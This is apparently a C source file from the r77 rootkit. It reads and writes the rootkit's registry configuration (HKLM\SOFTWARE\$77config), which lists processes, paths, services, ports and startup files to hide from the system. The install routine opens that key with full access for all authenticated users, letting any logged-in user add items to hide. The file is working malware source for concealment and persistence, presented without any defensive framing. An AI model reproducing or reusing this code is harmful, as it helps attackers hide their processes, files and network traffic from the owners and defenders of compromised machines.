#include "r77config.h"
#include "r77def.h"
#include <sddl.h>

PR77_CONFIG LoadR77Config()
{
	PR77_CONFIG config = NEW(R77_CONFIG);
	config->StartupFiles = CreateStringList(TRUE);
	config->HiddenProcessIds = CreateIntegerList();
	config->HiddenProcessNames = CreateStringList(TRUE);
	config->HiddenPaths = CreateStringList(TRUE);
	config->HiddenServiceNames = CreateStringList(TRUE);
	config->HiddenTcpLocalPorts = CreateIntegerList();
	config->HiddenTcpRemotePorts = CreateIntegerList();
	config->HiddenUdpPorts = CreateIntegerList();

	// Load configuration from HKEY_LOCAL_MACHINE\SOFTWARE\$77config
	HKEY key;
	if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\" HIDE_PREFIX L"config", 0, KEY_READ | KEY_WOW64_64KEY, &key) == ERROR_SUCCESS)
	{
		// Read startup files "startup" subkey.
		HKEY startupKey;
		if (RegOpenKeyExW(key, L"startup", 0, KEY_READ, &startupKey) == ERROR_SUCCESS)
		{
			LoadStringListFromRegistryKey(config->StartupFiles, startupKey, MAX_PATH);
			RegCloseKey(startupKey);
		}

		// Read process ID's from the "pid" subkey.
		HKEY pidKey;
		if (RegOpenKeyExW(key, L"pid", 0, KEY_READ, &pidKey) == ERROR_SUCCESS)
		{
			LoadIntegerListFromRegistryKey(config->HiddenProcessIds, pidKey);
			RegCloseKey(pidKey);
		}

		// Read process names from the "process_names" subkey.
		HKEY processNameKey;
		if (RegOpenKeyExW(key, L"process_names", 0, KEY_READ, &processNameKey) == ERROR_SUCCESS)
		{
			LoadStringListFromRegistryKey(config->HiddenProcessNames, processNameKey, MAX_PATH);
			RegCloseKey(processNameKey);
		}

		// Read paths from the "paths" subkey.
		HKEY pathKey;
		if (RegOpenKeyExW(key, L"paths", 0, KEY_READ, &pathKey) == ERROR_SUCCESS)
		{
			LoadStringListFromRegistryKey(config->HiddenPaths, pathKey, MAX_PATH);
			RegCloseKey(pathKey);
		}

		// Read service names from the "service_names" subkey.
		HKEY serviceNameKey;
		if (RegOpenKeyExW(key, L"service_names", 0, KEY_READ, &serviceNameKey) == ERROR_SUCCESS)
		{
			LoadStringListFromRegistryKey(config->HiddenServiceNames, serviceNameKey, MAX_PATH);
			RegCloseKey(serviceNameKey);
		}

		// Read local TCP ports from the "tcp_local" subkey.
		HKEY tcpLocalKey;
		if (RegOpenKeyExW(key, L"tcp_local", 0, KEY_READ, &tcpLocalKey) == ERROR_SUCCESS)
		{
			LoadIntegerListFromRegistryKey(config->HiddenTcpLocalPorts, tcpLocalKey);
			RegCloseKey(tcpLocalKey);
		}

		// Read remote TCP ports from the "tcp_remote" subkey.
		HKEY tcpRemoteKey;
		if (RegOpenKeyExW(key, L"tcp_remote", 0, KEY_READ, &tcpRemoteKey) == ERROR_SUCCESS)
		{
			LoadIntegerListFromRegistryKey(config->HiddenTcpRemotePorts, tcpRemoteKey);
			RegCloseKey(tcpRemoteKey);
		}

		// Read UDP ports from the "udp" subkey.
		HKEY udpKey;
		if (RegOpenKeyExW(key, L"udp", 0, KEY_READ, &udpKey) == ERROR_SUCCESS)
		{
			LoadIntegerListFromRegistryKey(config->HiddenUdpPorts, udpKey);
			RegCloseKey(udpKey);
		}

		RegCloseKey(key);
	}

	return config;
}
VOID DeleteR77Config(PR77_CONFIG config)
{
	DeleteStringList(config->StartupFiles);
	DeleteIntegerList(config->HiddenProcessIds);
	DeleteStringList(config->HiddenProcessNames);
	DeleteStringList(config->HiddenPaths);
	DeleteStringList(config->HiddenServiceNames);
	DeleteIntegerList(config->HiddenTcpLocalPorts);
	DeleteIntegerList(config->HiddenTcpRemotePorts);
	DeleteIntegerList(config->HiddenUdpPorts);
	i_memset(config, 0, sizeof(R77_CONFIG));
	FREE(config);
}
BOOL CompareR77Config(PR77_CONFIG configA, PR77_CONFIG configB)
{
	if (configA == configB)
	{
		return TRUE;
	}
	else if (configA == NULL || configB == NULL)
	{
		return FALSE;
	}
	else
	{
		return
			CompareStringList(configA->StartupFiles, configB->StartupFiles) &&
			CompareIntegerList(configA->HiddenProcessIds, configB->HiddenProcessIds) &&
			CompareStringList(configA->HiddenProcessNames, configB->HiddenProcessNames) &&
			CompareStringList(configA->HiddenPaths, configB->HiddenPaths) &&
			CompareStringList(configA->HiddenServiceNames, configB->HiddenServiceNames) &&
			CompareIntegerList(configA->HiddenTcpLocalPorts, configB->HiddenTcpLocalPorts) &&
			CompareIntegerList(configA->HiddenTcpRemotePorts, configB->HiddenTcpRemotePorts) &&
			CompareIntegerList(configA->HiddenUdpPorts, configB->HiddenUdpPorts);
	}
}
BOOL InstallR77Config(PHKEY key)
{
	if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\" HIDE_PREFIX L"config", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS | KEY_WOW64_64KEY, NULL, key, NULL) == ERROR_SUCCESS)
	{
		// Return TRUE, even if setting the DACL fails.
		// If DACL creation failed, only elevated processes will be able to write to the configuration system.
		PSECURITY_DESCRIPTOR securityDescriptor = NULL;
		ULONG securityDescriptorSize = 0;
		if (ConvertStringSecurityDescriptorToSecurityDescriptorW(L"D:(A;OICI;GA;;;AU)(A;OICI;GA;;;BA)", SDDL_REVISION_1, &securityDescriptor, &securityDescriptorSize))
		{
			RegSetKeySecurity(*key, DACL_SECURITY_INFORMATION, securityDescriptor);
			LocalFree(securityDescriptor);
		}

		return TRUE;
	}

	return FALSE;
}
VOID UninstallR77Config()
{
	// Delete subkeys in HKEY_LOCAL_MACHINE\SOFTWARE\$77config
	HKEY key;
	if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\" HIDE_PREFIX L"config", 0, KEY_ALL_ACCESS | KEY_WOW64_64KEY, &key) == ERROR_SUCCESS)
	{
		WCHAR subKeyName[1000];
		for (DWORD subKeyNameLength = 1000; RegEnumKeyExW(key, 0, subKeyName, &subKeyNameLength, NULL, NULL, NULL, NULL) == ERROR_SUCCESS; subKeyNameLength = 1000)
		{
			RegDeleteKeyW(key, subKeyName);
		}

		RegCloseKey(key);
	}

	// Delete HKEY_LOCAL_MACHINE\SOFTWARE\$77config
	RegDeleteKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\" HIDE_PREFIX L"config", KEY_ALL_ACCESS | KEY_WOW64_64KEY, 0);
}